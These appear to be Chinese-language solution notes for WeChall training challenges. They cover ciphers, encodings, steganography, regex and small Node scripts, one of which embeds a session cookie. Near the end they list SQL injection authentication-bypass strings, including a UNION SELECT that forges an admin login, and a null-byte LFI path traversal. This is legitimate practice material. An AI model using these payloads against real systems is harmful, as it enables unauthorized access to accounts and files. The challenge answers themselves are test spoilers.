# [参考链接](http://www.wechall.net/challs)

## [答案参考链接](http://winkar.github.io/2015/01/24/wechall.html)


1. [参考链接](http://www.wechall.net/challenge/training/get_sourced/index.php)
    * 点击右键查看源码

1. [参考链接](http://www.wechall.net/challenge/training/stegano1/index.php)
    * [图像相关知识参考链接](https://blog.csdn.net/u013378306/article/details/65936192)
    * [隐写术参考链接](https://blog.csdn.net/u011028345/article/details/75311346)
    * 通过图片编辑工具查看ascII值
    * window winhex、nodepad++ hex插件
    * [参考资料](https://blog.csdn.net/binwalker/article/details/77716326)
    * linux自带的
        ```
            hexdump -C file.name
        ```
        
1. [参考链接](http://www.wechall.net/challenge/training/crypto/caesar/index.php)
    * 恺撒加密[参考资料](https://www.cnblogs.com/dmego/p/6007143.html)
        ```ecmascript 6
               let arr = 'QEB NRFZH YOLTK CLU GRJMP LSBO QEB IXWV ALD LC ZXBPXO XKA VLRO RKFNRB PLIRQFLK FP ZFACKXLLYXXX'.split('')
               for (let i = 0; i < 26; i++) {
                 let result = arr.map(item => {
                   if (item === ' ') {
                     return item
                   }
                   return String.fromCharCode((item.charCodeAt(0) + i - 65) % 26 + 65).toLowerCase()
                 })
                 console.log(result.join(''))
               }
        ```
1. [参考链接](http://www.wechall.net/challenge/training/www/robots/index.php)
    * robots.txt
    
1. [参考链接](http://www.wechall.net/challenge/training/encodings/ascii/index.php)
    ```ecmascript 6
        let arr = [84, 104, 101, 32, 115, 111, 108, 117, 116, 105, 111, 110, 32, 105, 115, 58, 32, 99, 100, 101, 100, 103, 100, 97, 112, 104, 99, 110, 102]
        console.log(arr.map(item => String.fromCharCode(item)).join(''))
    ```

1. [参考链接](http://www.wechall.net/challenge/training/encodings/url/index.php)
    ```ecmascript 6
       decodeURIComponent('%59%69%70%70%65%68%21%20%59%6F%75%72%20%55%52%4C%20%69%73%20%63%68%61%6C%6C%65%6E%67%65%2F%74%72%61%69%6E%69%6E%67%2F%65%6E%63%6F%64%69%6E%67%73%2F%75%72%6C%2F%73%61%77%5F%6C%6F%74%69%6F%6E%2E%70%68%70%3F%70%3D%62%6C%6C%61%65%65%67%69%6E%68%66%68%26%63%69%64%3D%35%32%23%70%61%73%73%77%6F%72%64%3D%66%69%62%72%65%5F%6F%70%74%69%63%73%20%56%65%72%79%20%77%65%6C%6C%20%64%6F%6E%65%21')
    ```
    
1. [参考链接](http://www.wechall.net/challenge/training/programming1/index.php)
    * 先从浏览器获取cookie
    ```ecmascript 6
        const http = require('http')
        const opn = require('opn')
        
        const request = http.request({
            host: 'www.wechall.net',
            path: '/challenge/training/programming1/index.php?action=request',
            headers: {
                cookie: 'WC=11283876-43763-a8UttpPeOJGjwdza',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        }, (res) => {
            res.setEncoding('utf8')
            res.on('data', (data) => {
                opn('http://www.wechall.net/challenge/training/programming1/index.php?answer=' + data)
            })
        })
        request.write('')
        request.end()
    ```

1. [参考链接](http://www.wechall.net/challenge/training/regex/index.php)
    * [正则表达式三十分钟入门](https://www.cnblogs.com/sunny3096/p/7201403.html)
    * [js match结果](https://www.jianshu.com/p/f09508c14e65)
    * /^$/
    * /^wechall$/
    * /^(wechall4?)\.(?:jpg|gif|tiff|bmp|png)$/
    >>>
        (?=exp) 'sing'.match(/\w(?=ing)/) 匹配后面是ing的字符，匹配结果：s
        (?<=exp) 'sing'.match(/(?<=sin)\w/) 匹配前面是sin的字符，匹配结果：g
        (?!exp) 'sing'.match(/\w{2}(?!\w)/) 匹配两个字符，但是后面不能有字符，匹配结果：ng
        (?<!exp) 'sing'.match(/(?<!\w)\w{2}/) 匹配两个字符，但是前面不能有字符，匹配结果：si
    >>>
    
1. [参考链接](http://www.wechall.net/challenge/training/encodings1/index.php)
    * [解题思路](https://blog.csdn.net/smoggyxhdz/article/details/79885903)
    * 0-127基本字符, 128-255扩展字符.
    * ASCII 码使用指定的 7 位或 8 位二进制数组合来表示 128 或 256 种可能的字符。标准 ASCII 码使用 7 位二进制数来表示所有的大写和小写字母，数字 0 到 9、标点符号，以及在美式英语中使用的特殊控制字符。目前许多基于 x86 的系统都支持使用扩展（或“高”）ASCII。扩展 ASCII 码允许将每个字符的第 8 位用于确定附加的 128 个特殊符号字符、外来语字母和图形符号。
    * [编码相关的一些发展史](https://blog.csdn.net/dk_0520/article/details/70157426)
    
1. [参考链接](http://www.wechall.net/challenge/training/prime_factory/index.php)
    ```ecmascript 6
       function prime(num) {
         let i = 2
         while (i <= num / 2) {
           if (num % i === 0) {
             return false
           }
           i++
         }
         return true
       }
   
       let start = 1000000
       let result = []
       while (result.length < 2) {
         let sum = eval(start.toString().split('').join('+'))
         if (prime(start) && prime(sum)) {
           result.push(start)
         }
         start++
       }
       console.log(result.join(''))
    ```

1. [参考链接](http://www.wechall.net/challenge/training/php/lfi/up/index.php)
    * [文件上传常用方式](https://blog.csdn.net/qq_25987491/article/details/79965742)
    * [php%00截断](https://www.freebuf.com/articles/web/179401.html)
    * ../../solution.php%00

1. [参考链接](http://www.wechall.net/challenge/php0817/index.php)
    * which=solution
    ```ecmascript 6
       const str = 'oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt  oes eoyrup sawsro don:wf lldreslsas.b'
       for (let i = 2; i <= 5; i++) {
         let position = 0
         while (position < str.length) {
           console.log(str.substr(position, i).split('').reverse().join(''))
           position = position + i
         }
         console.log('--------------------------------------')
       }
    ```

1. [参考链接](http://www.wechall.net/challenge/training/crypto/simplesub1/index.php)
    * [单表代替密码原理及算法实现](https://www.cnblogs.com/ECJTUACM-873284962/p/7872114.html)
    * [自动置换网址](https://quipqiup.com/)
    
1. [参考链接](http://www.wechall.net/challenge/training/crypto/caesar2/index.php)
    ```ecmascript 6
          let str = '57 7F 7F 74 20 7A 7F 72 3C 20 09 7F 05 20 03 7F 7C 06 75 74 20 7F 7E 75 20 7D 7F 02 75 20 73 78 71 7C 7C 75 7E 77 75 20 79 7E 20 09 7F 05 02 20 7A 7F 05 02 7E 75 09 3E 20 64 78 79 03 20 7F 7E 75 20 07 71 03 20 76 71 79 02 7C 09 20 75 71 03 09 20 04 7F 20 73 02 71 73 7B 3E 20 67 71 03 7E 37 04 20 79 04 4F 20 41 42 48 20 7B 75 09 03 20 79 03 20 71 20 01 05 79 04 75 20 03 7D 71 7C 7C 20 7B 75 09 03 00 71 73 75 3C 20 03 7F 20 79 04 20 03 78 7F 05 7C 74 7E 37 04 20 78 71 06 75 20 04 71 7B 75 7E 20 09 7F 05 20 04 7F 7F 20 7C 7F 7E 77 20 04 7F 20 74 75 73 02 09 00 04 20 04 78 79 03 20 7D 75 03 03 71 77 75 3E 20 67 75 7C 7C 20 74 7F 7E 75 3C 20 09 7F 05 02 20 03 7F 7C 05 04 79 7F 7E 20 79 03 20 02 78 79 74 7E 02 71 71 75 7D 7D 7F 3E'
          str = str.split(' ')
          const arr = str.map(item => String.fromCharCode('0x' + item))
          for (let i = 0; i < 128 - 26; i++) {
            let result = arr.map(item => {
              return String.fromCharCode((item.charCodeAt(0) + i) % 128 + 26).toLowerCase()
            })
            if (/^[a-zA-Z]/.test(result[0])) {
              console.log(i, result.join(''))
            }
          }
    ```
    
1. [参考链接](http://www.wechall.net/challenge/training/crypto/digraph/index.php)
    * 网上的答案都是直接猜测第一个单词：congratulations
    * 个人表示不能接受，但是又没有其他更好的解决思路
    * C o n g r a t u l a t i o n s ! | y o u | d e c r y p t e d | t h i s | m e s s a g e | s u c c e s s f u l l y! | H a s | n o t | too | d i f f i c u l t | e i t h e r ? | w a s | i t sr | h e l l ? | g o o d | j o b! | ta n t e r | t h i s | k e y w o r d | as | s o l u t i o n : | s s n d g i m a i f g l !
    
1. [参考链接](http://www.wechall.net/challenge/training/mysql/auth_bypass1/index.php)
    * [mysql注入](https://www.cnblogs.com/pursuitofacm/p/6706961.html)
    * \# -- 都是mysql的注释
    * admin' or 1 = 1
    * admin'#
    * admin' or '1'='1
    * admin' --
    
1. [参考链接](http://www.wechall.net/challenge/training/mysql/auth_bypass1/index.php)
    * username: xxx' union select 1, 'admin', md5('1') #
    * username: xxx' union select 1, 'admin' as username, md5('1') as password where username='admin' #
    * password: 1

1. [参考链接](http://www.wechall.net/challenge/training/math/pyramid/index.php)
    * a^3/18^.5
